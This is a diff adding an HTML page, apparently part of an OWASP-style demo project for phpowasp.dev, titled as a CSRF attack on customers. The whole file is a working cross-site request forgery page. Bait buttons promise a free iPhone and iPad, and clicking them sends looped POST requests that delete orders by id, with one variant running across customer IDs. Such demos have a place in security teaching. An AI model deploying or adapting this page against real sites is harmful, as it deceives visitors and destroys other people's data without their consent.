@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>The Dirty CSRF Attack for Customers</title>
+</head>
+
+<body>
+    <button id='freeIphoneAndIpad' onclick='executeBadUser();'>
+        Click here for a free iPhone and iPad!
+    </button>
+    <button id='freeIphoneAndIpad' onclick='executeBadUserAgain();'>
+        Click here for a free iPhone and iPad!
+    </button>
+    <div id='success'></div>
+    <div id='fail'></div>
+<script type="text/javascript" src='//code.jquery.com/jquery-2.1.4.min.js'></script>
+<script type="text/javascript">
+function executeBadUser() {
+    "use strict";
+    var number = 100,
+        i,
+        success = document.getElementById('success');
+    for (i = 0; i < number; i += 1) {
+        (function(i) {
+            $.ajax({
+                url: "https://phpowasp.dev/jsHelper/reroute.php",
+                type: "POST",
+                crossDomain: true,
+                data: {
+                    to: "Controllers/Customers/RemoveOrderController.php",
+                    isAjax: true,
+                    action: "removeOrder",
+                    id: i,
+                    submit: true
+                }
+            }).done(function(data) {
+                success.textContent += "Thanks for deleting the data on order " + i;
+            }).fail(function(jqXHR) {
+                //fail.textContent += "Could not delete order with the id of " + i;
+            });
+        }(i));
+    }
+}
+
+function executeBadUserAgain() {
+    "use strict";
+    var number = 40,
+        i = 0,
+        j = 0,
+        success = document.getElementById('success');
+    for (i = 0; i < number, j < 20; i += 1) {
+        if (i === number) {
+            i = 0;
+            j += 1;
+        }
+        (function(i, j) {
+            $.ajax({
+                url: "https://phpowasp.dev/jsHelper/reroute.php",
+                type: "POST",
+                crossDomain: true,
+                data: {
+                    to: "Controllers/Customers/BadRemoveOrderController.php",
+                    isAjax: true,
+                    action: "removeOrder",
+                    id: i,
+                    customerID: j,
+                    submit: true
+                }
+            }).done(function(data) {
+                success.innerHTML += "Thanks for deleting the data on order " + i;
+            }).fail(function(jqXHR) {
+                //fail.textContent += "Could not delete order with the id of " + i;
+            });
+        }(i, j));
+    }
+}
+</script>
+</body>
+
+</html>
